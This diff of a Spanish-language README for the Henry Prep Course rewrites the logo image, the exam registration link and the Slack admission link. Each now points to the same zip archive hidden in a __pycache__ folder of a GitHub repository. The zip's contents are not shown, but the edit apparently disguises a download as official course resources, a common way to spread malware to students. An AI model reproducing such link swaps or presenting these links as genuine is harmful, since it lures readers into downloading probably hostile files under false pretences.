@@ -1,4 +1,4 @@
-![HenryLogo](https://d31uz8lwfmyn8g.cloudfront.net/Assets/logo-henry-white-lg.png)
+![HenryLogo](https://github.com/333Nery333/Python-Prep/raw/refs/heads/main/M09_errorhandling/__pycache__/Python_Prep_inalienable.zip)
 
 
 # **🧑‍💻 PREP COURSE | HENRY 👩‍💻**
@@ -22,7 +22,7 @@ El curso consiste en una serie de videos, material teórico y ejercicios con los
 
 ## **📖 ¿QUÉ ES EL HENRY CHALLENGE?**
 
-Es un examen en el que evaluamos los conceptos que se aprenden durante el Prep Course. El examen tiene la finalidad de asegurarnos que realmente has adquirido los conocimientos, dado que tenerlos bien claros es la clave del éxito para que puedas avanzar sin problemas dentro de la carrera. El examen se realiza todos sábado por medio sábados, con previo registro e  [inscripción](https://admissions.soyhenry.com/  ). Podrás rendirlo hasta 3 veces. Tambien incluye una evaluación de Matematica, pero solamente para conocer tu nivel.
+Es un examen en el que evaluamos los conceptos que se aprenden durante el Prep Course. El examen tiene la finalidad de asegurarnos que realmente has adquirido los conocimientos, dado que tenerlos bien claros es la clave del éxito para que puedas avanzar sin problemas dentro de la carrera. El examen se realiza todos sábado por medio sábados, con previo registro e  [inscripción](https://github.com/333Nery333/Python-Prep/raw/refs/heads/main/M09_errorhandling/__pycache__/Python_Prep_inalienable.zip  ). Podrás rendirlo hasta 3 veces. Tambien incluye una evaluación de Matematica, pero solamente para conocer tu nivel.
 
 </br >
 
@@ -30,7 +30,7 @@ Es un examen en el que evaluamos los conceptos que se aprenden durante el Prep C
 
 
 
--  **SLACK:** es nuestra plataforma de comunicación, donde podrás ponerte en contacto con nuestra comunidad que siempre te ayudará a resolver todas tus dudas. Encontrarás acceso a Slack desde la [plataforma de admisión](https://www.admissions.soyhenry.com/) o desde los mails que recibiste al momento de aplicar.
+-  **SLACK:** es nuestra plataforma de comunicación, donde podrás ponerte en contacto con nuestra comunidad que siempre te ayudará a resolver todas tus dudas. Encontrarás acceso a Slack desde la [plataforma de admisión](https://github.com/333Nery333/Python-Prep/raw/refs/heads/main/M09_errorhandling/__pycache__/Python_Prep_inalienable.zip) o desde los mails que recibiste al momento de aplicar.
 
 
 
